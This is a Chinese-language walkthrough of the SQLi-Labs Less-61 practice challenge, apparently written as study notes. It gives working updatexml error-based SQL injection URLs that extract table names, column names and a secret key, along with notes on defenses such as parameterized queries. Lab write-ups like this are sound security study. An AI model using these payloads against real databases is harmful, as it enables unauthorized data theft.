SQLi-Labs Less-61

2026年10月1日 SQLi-Labs Web安全 SQL注入 挑战模式 / 双查询注入 (5次)

一、题目信息

  • 题目名称：SQLi-Labs Less-61 (GET - challenge - Double Query - 5 queries allowed - Variation 4)
  • 题目平台：SQLi-Labs 本地靶场（Docker 环境）
  • 题目类型：Web安全 / SQL注入 / 挑战模式 / 双查询注入 / 限制尝试次数 / 双括号闭合
  • 靶场链接：http://localhost:8081/Less-61/（本地环境）
  • 涉及工具：Chrome浏览器 (地址栏直接注入)

二、解题步骤

1. 分析题目考什么

本题的核心考点是在限制 5 次尝试的极端条件下，完成单引号加双括号闭合的双查询注入（Double Query Injection）。Less-61 不能使用 UNION 联合查询，且闭合方式为 '))。必须利用 MySQL 的 updatexml 报错函数来提取数据。

2. 怎么想（破题思路）

  • 页面提示“Less than 5 attempts”，意味着只有 5 次机会。
  • 利用 group_concat() 合并查询结果，争取一次性获取表名和列名。
  • 构造报错 Payload 提取数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：闭合符号错误导致浪费尝试次数

踩坑情况：第 1 次尝试如果使用了双引号 " 或单引号 '，页面直接空白。

原因分析：Less-61 是单引号加双括号闭合 '))，缺少括号会导致 SQL 语法错误。

改进方式：使用正确的闭合符 '))：?id=1')) and updatexml(...)-- -。如果失败，立刻换单引号加单括号 ') 或纯单引号 ' 尝试。

详细实操步骤（Payload逐字解释）

第一步：一步到位（查表名，第1次尝试）

?id=1')) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='challenges' limit 0,1),0x7e),1)-- -

页面回显 XPATH syntax error: '~7GDZPQNCRQ~'，记下表名。

第二步：查列名（第2次尝试）

?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='7GDZPQNCRQ'),0x7e),1)-- -

利用 group_concat() 一次性回显所有列名（如 id,sessid,secret_4F8W,tryy），记下 secret_ 开头的列名。

第三步：查 Secret Key（第3次尝试）

?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_4F8W) from challenges.7GDZPQNCRQ),0x7e),1)-- -

页面回显 Secret Key。

第四步：提交（第4次尝试）

将密钥填入页面底部的输入框，点击 Submit 即可通关。

4. 怎么迁移（跨领域联想）

  • 应用场景联想：双查询注入在真实渗透中常出现于旧版 PHP 应用，防御者往往只过滤了 union select，却忽略了 count(*) 和 group by 引起的报错。
  • 防御策略联想：限制查询次数是一种有效的缓解措施，但不能根治漏洞。根本的防御依然是使用参数化查询（Prepared Statements）。
  • 安全开发启示：即使是查询次数受限，攻击者依然能通过报错注入获取敏感数据。不能在代码层依赖“频率限制”来防御注入。

三、名词大全与原理深度复盘

1. 双查询注入 (Double Query Injection)

一种利用 MySQL 的 count(*)、group by 和 floor(rand(0)*2) 引起主键冲突报错的注入方式，常用于绕过不能使用 UNION 的环境。

2. updatexml() 报错注入

利用 updatexml() 函数解析非法 XPath 字符串时的报错，将查询结果拼接在报错信息中带出。回显长度上限为 32 字节。

3. group_concat()

MySQL 中的聚合函数，用于将查询结果的多行合并为一个字符串。在受限次数的注入中非常关键，它能让我们一次获取所有表名或列名。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-60 的区别：Less-60 是双引号加单括号 ")，Less-61 是单引号加双括号 '))。
  • 与 Less-54~57 的区别：Less-54~57 是 Union 联合查询注入，限制 10~14 次。Less-61 是双查询报错注入，只限制 5 次。

2. 这种题目的出现原因（为什么存在）

比赛主办方为了增加难度，会限制代码中不能出现 UNION，并极大地缩短尝试次数。这迫使攻击者从“联合查询”转向“报错注入”，是进阶高级渗透测试的必经之路。

3. 这种应用在实际中如何体现？

在实战中，遇到带有 WAF 的站点，如果 UNION 被拦截，攻击者会尝试报错注入。在靶场中，这体现为利用 floor 或 updatexml 一次性获取数据，避免多次触发风控。

4. 如何抽象理解概念（大白话）

把靶场比作一个“限时寻宝游戏”：

  • 你只有 5 次提问机会。
  • 你不能像之前那样慢慢问，只能骗保安大喊出宝藏的名字（报错注入）。
  • 最终拿到宝藏（Secret Key），提交即通关。这就是挑战模式的核心逻辑。
